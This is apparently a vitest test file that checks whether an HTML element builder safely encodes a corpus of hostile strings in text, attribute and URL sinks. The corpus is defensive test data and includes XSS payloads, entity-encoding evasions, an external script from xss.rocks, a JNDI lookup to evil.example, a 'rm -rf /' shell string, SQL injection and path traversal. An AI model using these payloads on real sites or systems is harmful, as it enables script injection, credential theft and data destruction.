// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { el, serialise } from './el.js';

// The checked-in hostile-string corpus (issue #966; ADR 0022; CONTRIBUTING
// "Robust, context-aware output encoding"): every entry is pushed through each
// sink el() offers — text child, attribute value, URL-valued attribute — then
// the serialised output is RE-PARSED and asserted on the parsed DOM tree
// (zero script/handler/scheme survivals), never on string equality. The
// entries are drawn from the named public corpora patterns: Big List of
// Naughty Strings categories, the OWASP XSS filter-evasion shapes, and the
// semicolon-less numeric character references that defeat naive entity
// handling. Test names follow Subject_Scenario_Outcome.

// name → the hostile value. Categories are commented for future additions.
const HOSTILE_CORPUS: readonly { name: string; value: string }[] = [
  // --- Script/markup breakout (OWASP XSS filter evasion) ---
  { name: 'plain script tag', value: '<script>alert(1)</script>' },
  { name: 'attribute breakout then script', value: '"><script>alert(document.cookie)</script>' },
  { name: 'img onerror', value: '<img src=x onerror=alert(1)>' },
  { name: 'img javascript src', value: '<IMG SRC="javascript:alert(\'XSS\')">' },
  { name: 'mixed-case img javascript src', value: '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>' },
  { name: 'body onload', value: '<BODY ONLOAD=alert(\'XSS\')>' },
  { name: 'svg onload self-closing', value: '<svg/onload=alert(1)>' },
  { name: 'malformed double-open script', value: '<<SCRIPT>alert("XSS");//<</SCRIPT>' },
  { name: 'script src external', value: '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>' },
  { name: 'img with quote-gobbling attrs', value: '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">' },
  { name: 'closing-tag escape from rawtext', value: '</title></style></textarea></script><svg onload=alert(1)>' },
  { name: 'the Ultimate XSS polyglot', value: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>' },
  { name: 'event handler without tag', value: '" onmouseover="alert(1)' },
  { name: 'single-quote handler breakout', value: "' onfocus='alert(1)' autofocus='" },
  // --- Semicolon-less / padded numeric character references ---
  { name: 'semicolon-less decimal char refs', value: '&#106avascript:alert(1)' },
  { name: 'semicolon-less hex char refs', value: '&#x6A&#x61vascript:alert(1)' },
  { name: 'zero-padded decimal char refs', value: '&#0000106&#0000097vascript:alert(1)' },
  { name: 'entity-encoded colon', value: 'javascript&#58alert(1)' },
  { name: 'entity newline inside scheme', value: 'jav&#x0A;ascript:alert(1)' },
  { name: 'fully entity-encoded javascript src', value: '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>' },
  // --- Pre-encoded entities (double-encoding traps) ---
  { name: 'amp entity', value: '&amp;' },
  { name: 'lt-script entity', value: '&lt;script&gt;alert(1)&lt;/script&gt;' },
  { name: 'nbsp character', value: 'a\u00A0b' },
  // --- BLNS-style: injection idioms from other contexts ---
  { name: 'sql injection', value: "'; DROP TABLE callsigns;--" },
  { name: 'template literal', value: '${7*7}' },
  { name: 'handlebars', value: '{{7*7}}' },
  { name: 'erb', value: '<%= 7*7 %>' },
  { name: 'jndi lookup', value: '${jndi:ldap://evil.example/a}' },
  { name: 'shell backticks', value: '`rm -rf /`' },
  { name: 'path traversal', value: '../../etc/passwd' },
  { name: 'crlf-free header split attempt', value: 'x\nSet-Cookie: sid=1' },
  // --- BLNS-style: reserved-looking and confusing strings ---
  { name: 'the word null', value: 'null' },
  { name: 'the word undefined', value: 'undefined' },
  { name: 'NaN', value: 'NaN' },
  { name: 'empty-looking zero', value: '0' },
  { name: 'huge negative exponent', value: '-1e100' },
  // --- BLNS-style: unicode ---
  { name: 'fullwidth eval', value: 'ｅｖａｌ("alert(1)")' },
  { name: 'rtl override', value: '\u202Egnp.tacobat' },
  { name: 'mathematical alphanumerics', value: '𝕊𝕥𝕣𝕚𝕟𝕘 𝔴𝔦𝔱𝔥 𝖘𝖙𝖞𝖑𝖊' },
  { name: 'zero-width joiners', value: 'a\u200D\u200Cb' },
  { name: 'emoji zwj sequence', value: '👨‍👩‍👧‍👦 🏴󠁧󠁢󠁥󠁮󠁧󠁿' },
  { name: 'combining marks', value: 'Źàl̂g̃ō' },
];

// Parse a serialised fragment the way a browser meeting the static page would.
function reparse(html: string): Document {
  return new DOMParser().parseFromString(html, 'text/html');
}

// The parsed-DOM inertness sweep: nothing executable may exist anywhere in the
// re-parsed document — no script-capable elements, no on* handler attribute,
// and every URL-valued attribute resolves to a non-executable scheme.
function expectInert(doc: Document, context: string): void {
  expect(doc.querySelectorAll('script, iframe, object, embed, base').length, `${context}: script-capable element survived`).toBe(0);
  for (const node of doc.querySelectorAll('*')) {
    for (const attr of [...node.attributes]) {
      expect(attr.name.toLowerCase().startsWith('on'), `${context}: handler attribute ${attr.name} survived`).toBe(false);
      if (['href', 'src', 'cite'].includes(attr.name)) {
        const resolved = new URL(attr.value, 'https://example.test/');
        expect(['https:', 'http:', 'mailto:'].includes(resolved.protocol), `${context}: ${attr.name}="${attr.value}" resolves to ${resolved.protocol}`).toBe(true);
      }
    }
  }
}

describe('v1 el() hostile-string corpus — parsed-DOM assertions', { tags: ['ui'] }, () => {
  it('ElTextSink_EveryCorpusString_RoundTripsAsInertTextWithNoElementsBorn', () => {
    for (const { name, value } of HOSTILE_CORPUS) {
      const doc = reparse(serialise(el('div', { class: 'probe' }, value)));
      const probe = doc.querySelector('div.probe');
      expect(probe, `${name}: probe element lost`).not.toBeNull();
      // The hostile string is TEXT: byte-for-byte round-trip, zero child elements.
      expect(probe?.textContent, `${name}: text mangled in round-trip`).toBe(value);
      expect(probe?.childElementCount, `${name}: markup was born from text`).toBe(0);
      expectInert(doc, `text sink: ${name}`);
    }
  });

  it('ElAttributeSink_EveryCorpusString_RoundTripsAsTheInertAttributeValue', () => {
    for (const { name, value } of HOSTILE_CORPUS) {
      const doc = reparse(serialise(el('span', { class: 'probe', title: value })));
      const probe = doc.querySelector('span.probe');
      expect(probe, `${name}: probe element lost`).not.toBeNull();
      expect(probe?.getAttribute('title'), `${name}: attribute value mangled in round-trip`).toBe(value);
      // No attribute broke out of the quoted value: exactly the two we set.
      expect(probe?.attributes.length, `${name}: an attribute escaped its quoting`).toBe(2);
      expectInert(doc, `attribute sink: ${name}`);
    }
  });

  it('ElUrlSink_EveryCorpusString_NeverYieldsAnExecutableSchemeAfterReparse', () => {
    for (const { name, value } of HOSTILE_CORPUS) {
      const doc = reparse(serialise(el('a', { class: 'probe', href: value }, 'link')));
      const probe = doc.querySelector('a.probe');
      expect(probe, `${name}: probe element lost`).not.toBeNull();
      // Either neutralised to '#' or an inert relative/allowlisted reference —
      // never a value that resolves to an executable scheme (expectInert
      // resolves every href against a base and allowlists the scheme, which is
      // exactly how the semicolon-less char-ref evasions are proven dead: the
      // serialiser's &amp; escaping means the browser never re-decodes them
      // into `javascript:`).
      expectInert(doc, `url sink: ${name}`);
    }
  });

  it('ElUrlSink_DirectExecutableSchemes_AreNeutralisedToTheInertHashSpecifically', () => {
    for (const url of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,<script>x</script>', 'vbscript:x', '//evil.example/x']) {
      expect(el('a', { href: url }, 'x').getAttribute('href'), url).toBe('#');
    }
  });
});
